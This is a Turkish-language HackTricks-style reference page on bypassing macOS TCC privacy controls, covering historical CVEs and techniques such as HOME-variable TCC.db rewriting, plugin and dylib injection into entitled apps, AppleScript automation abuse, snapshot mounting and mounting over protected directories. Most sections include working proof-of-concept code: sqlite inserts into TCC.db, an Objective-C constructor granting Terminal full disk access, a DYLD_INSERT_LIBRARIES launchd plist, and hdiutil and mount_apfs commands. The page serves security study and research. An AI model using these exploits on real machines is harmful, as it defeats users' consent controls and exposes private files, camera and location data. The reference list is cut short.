# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## İşlevselliğe göre

### Write Bypass

Bu bir bypass değildir; TCC'nin çalışma şekli budur: **Yazmaya karşı koruma sağlamaz**. Terminal'in **bir kullanıcının Desktop'ını okuma erişimi yoksa bile hâlâ buraya yazabilir**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Yeni **dosyaya**, **oluşturan uygulamanın** dosyayı okumasına erişim vermek için **`com.apple.macl` genişletilmiş özniteliği** eklenir.<sup>[[2]](#references)</sup>

### TCC ClickJacking

Kullanıcının fark etmeden **kabul etmesini** sağlamak için **TCC isteminin üzerine bir pencere yerleştirmek** mümkündür. PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)** içinde bulabilirsiniz.**<sup>[[18]](#references)</sup>

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### Rastgele adla TCC Request

Saldırgan, **`Info.plist`** içinde **herhangi bir adla** (ör. Finder, Google Chrome...) **uygulamalar oluşturabilir** ve bu uygulamaların TCC tarafından korunan bir konuma erişim istemesini sağlayabilir. Kullanıcı, bu erişimi isteyenin meşru uygulama olduğunu düşünecektir.\
Ayrıca, **meşru uygulamayı Dock'tan kaldırıp sahte uygulamayı Dock'a yerleştirmek** mümkündür. Böylece kullanıcı, aynı simgeyi kullanabilen sahte uygulamaya tıkladığında sahte uygulama meşru uygulamayı çağırabilir, TCC izinlerini isteyebilir ve bir malware çalıştırabilir; bu da kullanıcının erişimi meşru uygulamanın istediğine inanmasını sağlar.<sup>[[2]](#references)</sup>

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Daha fazla bilgi ve PoC:


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Varsayılan olarak **SSH üzerinden erişim "Full Disk Access"** yetkisine sahipti. Bunu devre dışı bırakmak için erişimi listede bulundurmanız ancak devre dışı olarak işaretlemeniz gerekir (listeden kaldırmak bu ayrıcalıkları kaldırmaz):<sup>[[2]](#references)</sup>

![TCC Request by arbitrary name - SSH Bypass: Varsayılan olarak SSH üzerinden erişim "Full Disk Access" yetkisine sahipti. Bunu devre dışı bırakmak için erişimi listede bulundurmanız ancak devre dışı olarak işaretlemeniz gerekir (listeden kaldırmak...](<../../../../../images/image (1077).png>)

Burada bazı **malware'lerin bu korumayı nasıl bypass edebildiğine** dair örnekler bulabilirsiniz:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/) <sup>[[9]](#references)</sup>

> [!CAUTION]
> Artık SSH'yi etkinleştirebilmek için **Full Disk Access** gerektiğini unutmayın.

### Uzantıları işleme - CVE-2022-26767

**`com.apple.macl`** özniteliği, **belirli bir uygulamaya dosyayı okuma izni vermek** için dosyalara atanır. Bu öznitelik, bir dosya bir uygulamanın üzerine **sürüklenip bırakıldığında** veya kullanıcı bir dosyayı **varsayılan uygulamayla** açmak için **çift tıkladığında** ayarlanır.

Bu nedenle bir kullanıcı, tüm uzantıları işlemesi için **kötücül bir uygulamayı kaydedebilir** ve herhangi bir dosyayı **açmak** için Launch Services'i çağırabilir (böylece kötücül dosyaya dosyayı okuma erişimi verilir).<sup>[[23]](#references)</sup>

### iCloud

**`com.apple.private.icloud-account-access`** entitlement'ı ile **iCloud token'ları sağlayacak** olan **`com.apple.iCloudHelper`** XPC service ile iletişim kurmak mümkündür.

**iMovie** ve **Garageband** bu entitlement'a ve bunu mümkün kılan diğer entitlement'lara sahipti.

Bu entitlement kullanılarak **iCloud token'larını elde etme** exploit'i hakkında daha fazla **bilgi** için şu konuşmaya bakın: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)<sup>[[10]](#references)</sup>

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** iznine sahip bir uygulama **diğer App'leri kontrol edebilir**. Bu, **diğer App'lere verilmiş izinlerin kötüye kullanılabileceği** anlamına gelir.<sup>[[2]](#references)</sup>

Apple Scripts hakkında daha fazla bilgi için:


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Örneğin, bir App'in **`iTerm` üzerinde Automation izni** varsa, bu örnekte **`Terminal` iTerm'e erişebilir**:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### iTerm üzerinde

FDA'ya sahip olmayan Terminal, buna sahip olan iTerm'i çağırabilir ve eylemler gerçekleştirmek için onu kullanabilir:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder Üzerinden

Veya bir App'in Finder üzerinden erişimi varsa, aşağıdaki gibi bir script olabilir:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## App davranışına göre

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Kullanıcı alanındaki **tccd daemon**, TCC kullanıcı veritabanına şu konumdan erişmek için **`HOME`** **env** değişkenini kullanıyordu: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

[this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) ve TCC daemon'ının mevcut kullanıcının alanı içinde `launchd` aracılığıyla çalışması nedeniyle, kendisine aktarılan **tüm environment variable'ları kontrol etmek** mümkündür.<sup>[[19]](#references)</sup>\
Böylece bir **attacker**, **`launchctl`** içindeki **`$HOME` environment** değişkenini **kontrol ettiği** bir **directory**'yi gösterecek şekilde ayarlayabilir, **TCC** daemon'ını yeniden başlatabilir ve ardından son kullanıcıya hiçbir zaman prompt gösterilmeden kendisine **mevcut tüm TCC entitlement'larını** vermek için **TCC database'ini doğrudan değiştirebilir**.<sup>[[1]](#references)</sup>\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notlar

Notes, TCC tarafından korunan konumlara erişebiliyordu; ancak yeni oluşturulan bir not **korunmayan bir konumda depolanıyordu**. Bu nedenle bir attacker, Notes'tan korunan bir dosyayı bir nota kopyalamasını isteyebilir ve ardından ortaya çıkan verilere korunmayan konumdan erişebilirdi:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

`libsecurity_translocate` kütüphanesine sahip `/usr/libexec/lsd` binary'si, **nullfs** mount oluşturmasına izin veren `com.apple.private.nullfs_allow` entitlement'ına ve her dosyaya erişmek için **`kTCCServiceSystemPolicyAllFiles`** içeren `com.apple.private.tcc.allow` entitlement'ına sahipti.

"Library" konumuna quarantine attribute eklemek, **`com.apple.security.translocation`** XPC service'ini çağırmak ve ardından Library'yi **`$TMPDIR/AppTranslocation/d/d/Library`** konumuna map etmek mümkündü; böylece Library içindeki tüm dokümanlara **erişilebiliyordu**.

### CVE-2024-44131 - FileProvider symlink race

Dosya işlemlerini **privileged helper**'a (burada **`fileproviderd`** / **`Files.app`**) devreden uygulamalar, öğeleri **kullanıcı adına** kopyalar veya taşır; bu nedenle copy işlemi caller'ın yerine helper'ın privileges'larıyla çalışır.

Jamf Threat Labs, işlemden önce gerçekleştirilen symlink validation'ın **race edilebildiğini** gösterdi: attacker, **son** path component'ına (kontrol edilen bileşen) symlink yerleştirmek yerine, copy başladıktan **sonra** path'in **ara** directory'sini değiştirir. Ardından privileged helper, attacker tarafından kontrol edilen link'i takip ederek TCC tarafından korunan konumları **herhangi bir prompt göstermeden** okur/yazar.<sup>[[5]](#references)</sup>

Path'lerinde random UUID ile **korunmayan** directory'ler (örneğin `~/Library/Mobile Documents/com~apple~CloudDocs`) en kolay hedeflerdir; çünkü attacker, race gerçekleştirmek için tam path'i önceden tahmin edebilir.

> [!TIP]
> Aranması gereken generic pattern şudur: **bir path'i birden fazla kez çözen herhangi bir privileged process** (check-then-use veya source ve destination'ı ayrı ayrı çözen `rename()`/`copyfile()`) path'in ortasındaki bir directory değiştirilerek race edilebilir. Yalnızca `O_NOFOLLOW_ANY`, zaten açılmış bir directory FD üzerinde `openat()` veya `realpath()` + yeniden validation gerçekleştirilmesi bu açığı gerçekten kapatır.

Daha fazla bilgi için [**Jamf Threat Labs writeup'ı**](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/).<sup>[[5]](#references)</sup>

### SQLITE_SQLLOG_DIR

`libsqlite3`, environment variable'lar tarafından yönlendirilen bir logging hook ekleyen `SQLITE_ENABLE_SQLLOG` ile build edilebilir ([upstream `test_sqllog.c`](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)):<sup>[[6]](#references)</sup>

- **`SQLITE_SQLLOG_DIR=path`** – **açılan her database** için **database file'ın bir kopyası** ve SQL statement'larının log'u `path` içine yazılır (directory'nin önceden mevcut olması gerekir).
- **`SQLITE_SQLLOG_REUSE_FILES=0`** – bir DB her açıldığında/attach edildiğinde mevcut dosyayı yeniden kullanmak yerine **yeni bir kopya** oluşturur.
- **`SQLITE_SQLLOG_CONDITIONAL`** – yalnızca ana DB'nin yanında `<database>-sqllog` file'ı varsa bir connection'ı loglar.

Bu variable'ı FDA'ya sahip olan ve SQLite database'lerini açan bir process'e inject edebilirseniz, bu process korunan database'leri kontrol ettiğiniz bir directory'ye **memnuniyetle kopyalar**. Destination filename attacker-controlled data'dan türetildiği için destination'a yerleştirilen bir **symlink**, aynı primitive'i target process'in privileges'larıyla **arbitrary file write** işlemine dönüştürür.

### **SQLITE_AUTO_TRACE**

`SQLITE_AUTO_TRACE` environment variable'ı set edilirse, `libsqlite3.dylib` library'si tüm SQL query'lerini **loglamaya** başlar. Birçok application bu library'yi kullandığından, tüm SQLite query'lerini loglamak mümkündü.<sup>[[22]](#references)</sup>

Bazı Apple application'ları TCC tarafından korunan bilgilere erişmek için bu library'yi kullanıyordu.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### env-var driven file writes arama

Önceki iki örnek aynı generic technique'in örnekleridir ve daha fazlasını aramak faydalıdır: **TCC-privileged app'lere yüklenen framework'ler, işlemin caller-controlled bir path'te dosya oluşturmasını sağlayan debug/logging environment variable'larını sıklıkla açığa çıkarır**.

Bunları bulmak için workflow:

1. FDA veya başka bir değerli TCC permission'ına sahip bir hedef seçin (`Music`, `TV`, `Terminal`, MDM agents...) ve link ettiği framework'leri listeleyin (`otool -L`, `vmmap`).
2. Bu framework'lerde `getenv` string'lerini arayın: `strings -a /System/Library/Frameworks/<X>.framework/<X> | grep -iE '^[A-Z0-9_]{6,}$'`.
3. Aday variable'ları `launchctl setenv NAME /path/you/control` ile ayarlayın, uygulamayı başlatın ve `fs_usage -w -f filesys <pid>` veya `sudo fs_usage | grep <path>` ile filesystem üzerinde ne yaptığını izleyin.
4. İşlem dizininizde bir dosya **oluşturuyor veya yeniden adlandırıyorsa**, bir write primitive elde etmişsinizdir: hedefi bir symlink'e yönlendirin (veya yukarıdaki CVE-2024-44131'de olduğu gibi bir intermediate directory üzerinde race gerçekleştirin) ve dosyanın `~/Library/Application Support/com.apple.TCC/TCC.db` üzerine yönlendirilmesini sağlayın.

> [!TIP]
> Bunu sınırlayan iki nokta vardır. İlk olarak, uygulama [`com.apple.security.cs.allow-dyld-environment-variables`](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables) entitlement'ını ("uygulamanın, uygulamanızın process'ine code inject etmek için kullanabileceğiniz dynamic linker environment variable'larından etkilenip etkilenemeyeceğini belirten Boolean değer") taşımıyorsa **`DYLD_*` variable'ları hardened-runtime binary'leri tarafından yok sayılır** — ayrıca [Notarization: the hardened runtime](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/) sayfasına bakın. İkinci olarak Apple, framework debug variable'ları rapor edildikçe tek tek kaldırır; bu nedenle bir macOS release'inde çalışan bir variable, sonraki release'te çoğunlukla yoktur. Bir variable ayarladıktan sonra uygulama sessizce başlamayı reddederse, bu variable'ın zaten filtrelendiğini varsayın.<sup>[[7]](#references)[[8]](#references)</sup>

Linker variable'larıyla aynı yöntemi görmek için [macOS Dyld Hijacking & DYLD_INSERT_LIBRARIES](../../../macos-proces-abuse/macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) sayfasına bakın.

### Apple Remote Desktop

Root olarak bu servisi etkinleştirebilirsiniz; böylece **ARD agent full disk access'e sahip olur** ve bu durum bir user tarafından yeni bir **TCC user database** kopyalatmak için abuse edilebilir.

## **NFSHomeDirectory** ile

TCC, kullanıcıya özel kaynaklara erişimi kontrol etmek için kullanıcının HOME klasöründe şu konumda bir database kullanır: **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Bu nedenle user, `$HOME` env variable'ının **farklı bir folder'ı** göstermesiyle TCC'yi restart etmeyi başarırsa, **/Library/Application Support/com.apple.TCC/TCC.db** içinde yeni bir TCC database oluşturabilir ve TCC'yi herhangi bir app'e herhangi bir TCC permission vermesi için kandırabilir.

> [!TIP]
> Apple'ın `$HOME` **value'su** için user profile içinde **`NFSHomeDirectory`** attribute'unda saklanan ayarı kullandığını unutmayın; bu nedenle bu value'yu değiştirme permission'ına (**`kTCCServiceSystemPolicySysAdminFiles`**) sahip bir application'ı compromise ederseniz, bu seçeneği bir TCC bypass ile **weaponize** edebilirsiniz.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**İlk POC**, kullanıcının **HOME** folder'ını değiştirmek için [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ve [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kullanır.

1. Hedef app için bir _csreq_ blob'u alın.
2. Gerekli access ve _csreq_ blob'u ile sahte bir _TCC.db_ dosyası yerleştirin.
3. Kullanıcının Directory Services entry'sini [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile export edin.
4. Kullanıcının home directory'sini değiştirmek için Directory Services entry'sini değiştirin.
5. Değiştirilmiş Directory Services entry'sini [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile import edin.
6. Kullanıcının _tccd_'sini durdurun ve process'i reboot edin.

İkinci POC, değer olarak `kTCCServiceSystemPolicySysAdminFiles` içeren `com.apple.private.tcc.allow` entitlement'ına sahip **`/usr/libexec/configd`**'yi kullandı.\
**`configd`**'yi **`-t`** option'ı ile çalıştırmak mümkündü; attacker **yüklenmek üzere custom bir Bundle belirtebiliyordu**. Bu nedenle exploit, kullanıcının home directory'sini değiştirmek için kullanılan **`dsexport`** ve **`dsimport`** method'larının yerine **`configd` code injection** kullanır.

Daha fazla bilgi için [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) sayfasına bakın.<sup>[[11]](#references)</sup>

## Process injection ile

Bir process içine code inject etmek ve onun TCC privilege'larını abuse etmek için farklı technique'ler vardır:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Bununla birlikte, TCC bypass için bulunan en yaygın process injection, **plugin'ler (load library)** aracılığıyladır.\
Plugin'ler genellikle library veya plist biçimindeki, **main application tarafından yüklenen** ve onun context'i altında çalışan ek code'lardır. Bu nedenle main application'ın TCC restricted file'lara erişimi varsa (verilmiş permission'lar veya entitlement'lar aracılığıyla), **custom code da aynı erişime sahip olur**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` application'ı **`kTCCServiceSystemPolicySysAdminFiles`** entitlement'ına sahipti, **`.daplug`** extension'ına sahip plugin'leri yüklüyordu ve **hardened** runtime'a sahip değildi.

Bu CVE'yi weaponize etmek için **`NFSHomeDirectory`**, kullanıcının TCC database'ini **ele geçirmek** ve TCC'yi bypass etmek amacıyla (önceki entitlement abuse edilerek) **değiştirilir**.

Daha fazla bilgi için [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) sayfasına bakın.<sup>[[12]](#references)</sup>

### CVE-2020-29621 - Coreaudiod

**`/usr/sbin/coreaudiod`** binary'si `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` entitlement'larına sahipti. İlki **code injection'a izin veriyor**, ikincisi ise ona **TCC'yi yönetme erişimi** sağlıyordu.

Bu binary, `/Library/Audio/Plug-Ins/HAL` folder'ından **third party plug-in'ler** yükleyebiliyordu. Bu nedenle bir plugin yüklemek ve TCC permission'larını abuse etmek mümkündü; POC:<sup>[[13]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) bakın.<sup>[[13]](#references)</sup>

### Device Abstraction Layer (DAL) Plug-Ins

Core Media I/O üzerinden kamera akışını açan sistem uygulamaları (**`kTCCServiceCamera`** kullanan uygulamalar), `/Library/CoreMediaIO/Plug-Ins/DAL` konumunda bulunan bu eklentileri (SIP tarafından kısıtlanmamış) **işlem içinde yükler**.

Buraya yalnızca yaygın **constructor** içeren bir library yerleştirmek **kod enjekte etmek** için yeterlidir.

Birkaç Apple uygulaması buna karşı savunmasızdı.

### Firefox

Firefox uygulamasında `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` entitlement'ları bulunuyordu:<sup>[[14]](#references)</sup>
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Bu yöntemin nasıl kolayca exploit edilebileceği hakkında daha fazla bilgi için [**orijinal rapora göz atın**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).<sup>[[14]](#references)</sup>

### CVE-2020-10006

`/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` binary'si **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** entitlement'larına sahipti; bu da process içine code inject edilmesine ve TCC ayrıcalıklarının kullanılmasına olanak tanıyordu.

### CVE-2023-26818 - Telegram

Telegram, **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** entitlement'larına sahipti. Bu nedenle, kamera ile kayıt yapmak gibi **izinlerine erişim sağlamak** için kötüye kullanılması mümkündü. [**Payload'ı writeup içinde bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).<sup>[[15]](#references)</sup>

Bir library yüklemek için env variable'ın nasıl kullanıldığına dikkat edin: bu library'yi inject etmek amacıyla **custom plist** oluşturuldu ve bunu başlatmak için **`launchctl`** kullanıldı:<sup>[[15]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## open çağrılarıyla

Sandboxed durumdayken bile **`open`** çağrısı yapmak mümkündür.

### Terminal Scripts

Tech kişiler tarafından kullanılan bilgisayarlarda terminale **Full Disk Access (FDA)** vermek oldukça yaygındır. Ayrıca bu erişimle **`.terminal`** script'lerini çağırmak da mümkündür.

**`.terminal`** script'leri, çalıştırılacak komutun **`CommandString`** anahtarında bulunduğu aşağıdaki gibi plist dosyalarıdır:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Bir uygulama, /tmp gibi bir konuma bir terminal betiği yazabilir ve bunu şu tür bir komutla çalıştırabilir:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Mount ederek

### CVE-2020-9771 - mount_apfs TCC bypass ve privilege escalation

**Herhangi bir kullanıcı** (unprivileged kullanıcılar bile) bir Time Machine snapshot'ı oluşturup mount edebilir ve bu snapshot'taki **TÜM dosyalara erişebilir**.\
Gerekli **tek ayrıcalık**, kullanılan uygulamanın (örneğin `Terminal`) bir admin tarafından verilmesi gereken **Full Disk Access** (FDA) erişimine (`kTCCServiceSystemPolicyAllfiles`) sahip olmasıdır.<sup>[[2]](#references)</sup>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**<sup>[[20]](#references)</sup>

### CVE-2021-1784 & CVE-2021-30808 - TCC file üzerine mount

TCC DB file korumalı olsa bile, yeni bir TCC.db file'ını **directory üzerine mount etmek** mümkündü:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
[**orijinal writeup**](https://theevilbit.github.io/posts/cve-2021-30808/) içindeki **tam exploit**'i inceleyin.<sup>[[21]](#references)</sup>

### CVE-2024-40855

[orijinal writeup](https://www.kandji.io/blog/macos-audit-story-part2) içinde açıklandığı üzere, bu CVE `diskarbitrationd`'yi kötüye kullanıyordu.<sup>[[16]](#references)</sup>

Public `DiskArbitration` framework'ündeki `DADiskMountWithArgumentsCommon` işlevi security kontrollerini gerçekleştiriyordu. Ancak `diskarbitrationd`'yi doğrudan çağırarak bunu bypass etmek ve bu nedenle path içinde `../` öğeleri ile symlink'ler kullanmak mümkündü.

Bu durum, `diskarbitrationd`'nin `com.apple.private.security.storage-exempt.heritable` entitlement'ı sayesinde TCC database'inin üzerine mount etmek de dahil olmak üzere, bir saldırganın herhangi bir konumda arbitrary mount gerçekleştirmesine olanak tanıyordu.

### asr

**`/usr/sbin/asr`** aracı, tüm diski kopyalamaya ve TCC korumalarını bypass ederek başka bir konuma mount etmeye izin veriyordu.

### CVE-2022-22655 - Location Services

Location Services, diğer servisler gibi bir TCC database'inde **saklanmaz**. Kendi allow-list'ini **`/var/db/locationd/clients.plist`** içinde tutan `locationd` tarafından yönetilir:<sup>[[4]](#references)</sup>
```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```
Her giriş, client tarafından (bundle ID veya executable path) anahtarlanır ve `Authorized`, `BundleId`, `Executable` ve `Registered` gibi alanlar içerir.<sup>[[4]](#references)</sup>

`clients.plist` dosyasının kendisi Sandbox/TCC tarafından korunur ve root olarak bile düzenlenemez — ancak **`/var/db/locationd/` dizini mount edilmekten korunmuyordu**. Bu nedenle root olarak çalışan bir attacker, kendi `clients.plist` dosyasını içeren bir disk image oluşturabilir (binary'si `Authorized` olarak işaretlenmiş şekilde), bunu dizinin üzerine mount edebilir ve sahte allow-list'in etkinleşmesi için `locationd`'yi yeniden başlatabilirdi.<sup>[[3]](#references)</sup>

> [!TIP]
> Bu, yukarıdaki `hdiutil`/`mount` TCC bypass'leriyle aynı modeldir: *dosya* korunur, dosyanın bulunduğu *dizin* korunmaz; bu nedenle dosya yerine dizinin tamamını değiştirirsiniz.

## Startup apps aracılığıyla


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## grep aracılığıyla

Bazı durumlarda dosyalar e-postalar, telefon numaraları, mesajlar... gibi hassas bilgileri korumasız konumlarda depolar (Apple açısından bunlar vulnerability olarak değerlendirilir).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Bu artık çalışmıyor, ancak [**geçmişte çalışıyordu**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

[**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) kullanmanın başka bir yolu:<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: macOS Transparency, Consent, and Control (TCC) Framework'ünü Bypass Etme](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [macOS TCC User Privacy Protections'ı Kazara ve Tasarım Yoluyla Bypass Etme](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
